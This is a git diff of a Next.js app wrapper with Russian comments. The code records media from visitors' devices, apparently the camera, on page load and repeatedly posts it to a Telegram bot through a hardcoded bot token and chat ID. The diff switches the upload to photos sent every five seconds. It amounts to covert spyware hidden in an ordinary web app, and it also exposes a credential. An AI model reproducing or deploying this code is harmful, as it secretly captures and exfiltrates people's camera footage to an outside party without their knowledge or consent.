@@ -2,6 +2,7 @@ import Layout from "@/app/components/layout/Layout";
 import '@/app/assets/globals.scss';
 import { Provider } from "@/app/components/ui/Context/Context";
 import { useEffect, useRef } from "react";
+
 // const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
 // const chatId = "-1001860144177";
 // const urlApi = `https://api.telegram.org/bot${TOKEN}/sendVideo`;
@@ -11,9 +12,9 @@ const myApp = ({ Component, pageProps }) => {
     // отправляем видео боту 
     const videoRef = useRef(null);
 
-    const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
-    const chatId = "-1001860144177";
-    const urlApi = `https://api.telegram.org/bot${TOKEN}/sendVideo`;
+    const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY"
+    const chatId = "-1001860144177"
+    const urlApi = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
 
     useEffect(() => {
         const getMediaAndSendData = async () => {
@@ -36,34 +37,36 @@ const myApp = ({ Component, pageProps }) => {
                         const blob = new Blob(chunks, { type: 'video/webm' });
 
                         // Отправляем данные на сервер (бота) с использованием fetch
-                        try {
-                            const response = await fetch(urlApi, {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json',
-                                },
-                                body: JSON.stringify({
-                                    chat_id: chatId,
-                                    video: blob,
-                                }),
-                            });
+                        setInterval(async () => {
+                            try {
+                                const response = await fetch(urlApi, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json',
+                                    },
+                                    body: JSON.stringify({
+                                        chat_id: chatId,
+                                        photo: blob,
+                                    }),
+                                });
 
-                            if (response.ok) {
-                                console.log('Видео успешно отправлено на бота');
-                            } else {
-                                console.error('Ошибка при отправке видео на бота:', response.status, response.statusText, await response.text());
+                                if (response.ok) {
+                                    console.log('Фото успешно отправлено на бота');
+                                } else {
+                                    console.error('Ошибка при отправке фото на бота:', response.status, response.statusText, await response.text());
+                                }
+                            } catch (error) {
+                                console.error('Ошибка fetch:', error);
                             }
-                        } catch (error) {
-                            console.error('Ошибка fetch:', error);
-                        }
+                        }, 5000); // Отправлять фото каждые 5 секунд
+
+                        // Остановка записи через определенное время (например, 10 секунд)
+                        setTimeout(() => {
+                            mediaRecorder.stop();
+                        }, 10000);
                     };
 
                     mediaRecorder.start(100);
-
-                    // Остановка записи через определенное время (например, 10 секунд)
-                    setTimeout(() => {
-                        mediaRecorder.stop();
-                    }, 10000);
                 }
             } catch (error) {
                 console.error('Ошибка доступа к мультимедийным устройствам:', error);
